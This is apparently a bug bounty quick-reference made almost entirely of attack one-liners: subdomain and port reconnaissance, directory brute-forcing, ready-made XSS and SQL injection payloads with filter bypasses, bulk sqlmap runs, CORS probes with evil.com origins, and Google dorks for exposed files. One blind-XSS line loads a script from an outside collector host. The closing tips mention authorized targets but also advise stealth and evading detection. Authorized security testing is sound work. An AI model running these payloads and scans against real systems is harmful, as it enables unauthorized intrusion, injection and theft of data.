# Bug Bounty Quick Commands Reference

## 1. Top 20 Most Useful Reconnaissance One-Liners

```bash
# Basic subdomain enumeration
subfinder -d target.com -all -recursive | httpx -silent | anew subdomains.txt

# Comprehensive subdomain discovery
amass enum -passive -d target.com | assetfinder -subs-only target.com | sort -u

# Quick alive subdomain check
cat subdomains.txt | httpx -title -sc -tech -threads 200

# URL collection from multiple sources
gau target.com | waybackurls target.com | katana -u target.com -d 5 | sort -u

# JavaScript file discovery
subfinder -d target.com | gau | grep -E '\.js$' | httpx -mc 200

# Parameter discovery
gau target.com | grep '=' | unfurl keys | sort -u

# Technology stack identification
httpx -l subdomains.txt -title -tech -status-code

# Certificate transparency logs
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Shodan reconnaissance
shodan search Ssl.cert.subject.CN:"target.com" 200 --fields ip_str

# Archive URLs with parameters
echo target.com | gau --mc 200 | grep '=' | sort -u

# Hidden directories & files
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404,403

# GitHub subdomain enumeration
github-subdomains -d target.com -t YOUR_TOKEN

# DNS bruteforcing
ffuf -u "http://target.com" -H "Host: FUZZ.target.com" -w subdomains.txt

# Live screenshot capture
gowitness file -f alive_subdomains.txt --threads 4

# Quick port scan on subdomains
naabu -l subdomains.txt -top-ports 1000 -silent

# API endpoint discovery
curl -s https://target.com/robots.txt | grep -i api

# Social media & code repositories
echo target.com | dnsrecon -d target.com -t brt

# SSL certificate analysis
sslscan target.com | grep -i subject

# Quick vulnerability scan
nuclei -l subdomains.txt -t nuclei-templates/ -severity critical,high

# Content discovery with extensions
gobuster dir -u https://target.com -w common.txt -x php,html,js,txt,bak
```

## 2. Essential XSS Testing Commands

```bash
# Basic XSS parameter testing
gau target.com | grep '=' | qsreplace '"><script>alert(1)</script>' | freq

# Comprehensive XSS pipeline
gau target.com | gf xss | uro | httpx -silent | Gxss -p Rxss | dalfox pipe

# Blind XSS with headers
subfinder -d target.com | gau | bxss -payload '"><script src=https://xss.report/c/YOUR_ID></script>' -header "X-Forwarded-For"

# DOM XSS detection
echo target.com | katana -d 5 | grep -E '\.js$' | nuclei -t xss-templates/

# Reflected XSS testing
gau target.com --threads 5 | grep "=" | qsreplace '"><script>confirm(1)</script>' | while read url; do curl -sk "$url" | grep -q "confirm(1)" && echo "VULN: $url"; done

# XSS in JavaScript files
cat js_files.txt | nuclei -t nuclei-templates/http/exposures/

# Header-based XSS
echo target.com | httpx | while read url; do curl -H "X-Forwarded-For: <script>alert(1)</script>" "$url"; done

# Cookie-based XSS
curl -b "test=<script>alert(1)</script>" https://target.com/

# POST data XSS
curl -X POST -d "param=<script>alert(1)</script>" https://target.com/

# XSS bypass filters
'"><svg onload=alert(1)>
javascript:alert(1)//
<img src=x onerror=alert(1)>
```

## 3. Critical SQL Injection Detection Commands

```bash
# Basic SQLi parameter testing
gau target.com | gf sqli | qsreplace "'" | httpx -mc 500

# Comprehensive SQLi testing
sqlmap -u "https://target.com/page.php?id=1" --batch --dbs --level 3

# Time-based blind SQLi
gau target.com | grep '=' | qsreplace "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--" 

# Union-based SQLi detection
echo "https://target.com/page.php?id=1" | sqlmap --batch --technique=U

# Error-based SQLi
gau target.com | gf sqli | qsreplace "1'" | httpx | grep -i "sql\|mysql\|error"

# Boolean-based blind SQLi
curl "https://target.com/page.php?id=1 AND 1=1" vs "1 AND 1=2"

# Second-order SQLi
sqlmap -u "https://target.com/login" --data "user=admin&pass=test" --second-order "https://target.com/profile"

# JSON SQLi
sqlmap -u "https://target.com/api" --data='{"id":"1"}' --level 5

# Header injection
sqlmap -u "https://target.com/" --headers="X-Forwarded-For: 1'"

# Bulk SQLi testing
subfinder -d target.com | gau | gf sqli | qsreplace "FUZZ" | sqlmap -m - --batch
```

## 4. Key Subdomain Enumeration Commands

```bash
# Passive subdomain discovery
subfinder -d target.com -all -recursive -silent

# Certificate transparency
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u

# DNS bruteforcing
amass enum -brute -d target.com -w dns_wordlist.txt

# GitHub reconnaissance
github-subdomains -d target.com -t TOKEN -o github_subs.txt

# Shodan subdomain discovery
shodan search hostname:target.com --fields hostnames

# Archive-based discovery
waybackurls target.com | unfurl domains | sort -u

# Rapid7 FDNS
curl -s "https://opendata.rapid7.com/sonar.fdns_v2/..." | grep target.com

# Brute force with SecLists
ffuf -u "http://FUZZ.target.com" -w subdomains.txt -mc 200

# ASN enumeration
amass intel -asn ASN_NUMBER

# Recursive subdomain enumeration
subfinder -d target.com | subfinder -dL - -all -recursive
```

## 5. Important Port Scanning Commands

```bash
# Fast port scan
nmap -T4 --min-rate=1000 -p- target.com

# Service version detection
nmap -sV -sC -O target.com

# UDP scan for common services
nmap -sU --top-ports 1000 target.com

# Masscan for speed
masscan -p1-65535 target.com --rate=1000

# Naabu for subdomain port scanning
naabu -l subdomains.txt -top-ports 1000 -silent

# Specific service scanning
nmap -p 80,443,8080,8443 --script http-enum target.com

# Banner grabbing
nmap -sV --version-intensity 5 -p- target.com

# Stealth scan
nmap -sS -T2 -p- target.com

# All TCP ports
nmap -p- --min-rate 5000 target.com

# Common ports with scripts
nmap -sC -sV -p 21,22,23,25,53,80,110,443,993,995 target.com
```

## 6. Quick Vulnerability Scanning Commands

```bash
# Nuclei comprehensive scan
nuclei -l targets.txt -t nuclei-templates/ -severity critical,high,medium

# CVE-specific scanning
nuclei -u target.com -tags cve -severity critical

# Technology-specific templates
nuclei -l subdomains.txt -tags apache,nginx,php -o vuln_results.txt

# Exposure detection
nuclei -l urls.txt -tags exposure,config,logs

# Takeover detection
nuclei -l subdomains.txt -t nuclei-templates/takeovers/

# Custom template execution
nuclei -u target.com -t custom_template.yaml

# WordPress scanning
wpscan --url https://target.com --api-token TOKEN -e ap,at,u

# SSL/TLS vulnerabilities
testssl.sh target.com

# Directory traversal
nuclei -u target.com -tags lfi,directory-traversal

# CORS misconfiguration
python3 corsy.py -i urls.txt -t 10
```

## 7. Fast Directory/File Enumeration Commands

```bash
# Gobuster directory enumeration
gobuster dir -u https://target.com -w common.txt -x php,html,js,txt -t 50

# Ffuf with extensions
ffuf -u https://target.com/FUZZ -w wordlist.txt -e .php,.html,.js,.txt,.bak

# Dirsearch comprehensive
dirsearch -u https://target.com -e php,html,js,txt,bak,old,zip -r -t 50

# Feroxbuster recursive
feroxbuster -u https://target.com -w wordlist.txt -x php,html,js -d 3

# Content discovery with status codes
gobuster dir -u https://target.com -w wordlist.txt -s '200,204,301,302,307,403'

# API endpoint discovery
gobuster dir -u https://target.com -w api_wordlist.txt -p api_pattern.txt

# Backup file hunting
ffuf -u https://target.com/FUZZ -w files.txt -e .bak,.old,.backup,.tmp

# Common file extensions
gobuster dir -u https://target.com -w common.txt -x asp,aspx,jsp,php,html

# Hidden directories
dirb https://target.com /usr/share/dirb/wordlists/common.txt

# Archive-based file discovery
waybackurls target.com | grep -E '\.(php|asp|jsp|html)$' | sort -u
```

## 8. Essential API Testing Commands

```bash
# API endpoint discovery
curl -s https://target.com/robots.txt | grep -i api

# Swagger/OpenAPI discovery
ffuf -u https://target.com/FUZZ -w api_paths.txt -mc 200

# REST API enumeration
gobuster dir -u https://target.com/api -w api_wordlist.txt

# GraphQL introspection
curl -X POST https://target.com/graphql -d '{"query":"query IntrospectionQuery { __schema { queryType { name } } }"}'

# API version testing
curl https://target.com/api/v1/ vs /api/v2/

# Parameter fuzzing
ffuf -u https://target.com/api/users?FUZZ=1 -w parameters.txt

# HTTP methods testing
curl -X GET,POST,PUT,DELETE https://target.com/api/endpoint

# API key testing
curl -H "X-API-Key: test" https://target.com/api/

# JSON parameter injection
curl -X POST -H "Content-Type: application/json" -d '{"id":"1'"'"'"}' https://target.com/api/

# Rate limit testing
for i in {1..100}; do curl https://target.com/api/endpoint; done
```

## 9. Quick CORS Testing Commands

```bash
# Basic CORS test
curl -H "Origin: https://evil.com" -I https://target.com

# Null origin bypass
curl -H "Origin: null" -I https://target.com

# Subdomain CORS test
curl -H "Origin: https://evil.target.com" -I https://target.com

# IP-based origin
curl -H "Origin: https://127.0.0.1" -I https://target.com

# HTTPS to HTTP bypass
curl -H "Origin: http://target.com" -I https://target.com

# Wildcard bypass attempts
curl -H "Origin: https://target.com.evil.com" -I https://target.com

# Multiple origins test
curl -H "Origin: https://evil1.com" -H "Origin: https://evil2.com" -I https://target.com

# Automated CORS testing
python3 corsy.py -i subdomains.txt -t 10

# Pre-flight request test
curl -X OPTIONS -H "Origin: https://evil.com" -H "Access-Control-Request-Method: GET" https://target.com

# Bulk CORS testing
gau target.com | while read url; do curl -sIH "Origin: https://evil.com" "$url" | grep -i access-control && echo "CORS: $url"; done
```

## 10. Most Useful Google Dorks (Top 15)

```bash
# Sensitive file exposure
site:target.com filetype:pdf | filetype:doc | filetype:xls | filetype:txt

# Configuration files
site:target.com ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg

# Database files
site:target.com ext:sql | ext:dbf | ext:mdb

# Backup files
site:target.com ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup

# Log files
site:target.com ext:log

# Login pages
site:target.com inurl:login | inurl:signin | inurl:admin | inurl:dashboard

# Parameter hunting
site:target.com inurl:id= | inurl:pid= | inurl:category= | inurl:product=

# Directory listings
site:target.com intitle:"index of"

# Error messages
site:target.com intext:"sql syntax near" | intext:"syntax error" | intext:"mysql_fetch_array()"

# Subdomains
site:*.target.com

# Social media profiles
site:facebook.com | site:twitter.com | site:linkedin.com "target company"

# Email addresses
site:target.com "@target.com"

# Technology stack
site:target.com "powered by" | "built with" | "running on"

# API endpoints
site:target.com inurl:api | inurl:v1 | inurl:v2 | inurl:rest

# Cloud storage
site:s3.amazonaws.com "target.com" | site:blob.core.windows.net "target.com"
```

---

**Usage Tips:**
- Replace `target.com` with your actual target domain
- Always test on authorized targets only
- Use appropriate rate limiting to avoid detection
- Combine tools in pipelines for better results
- Save outputs to files for further analysis
- Use proxies and user agents for stealth when needed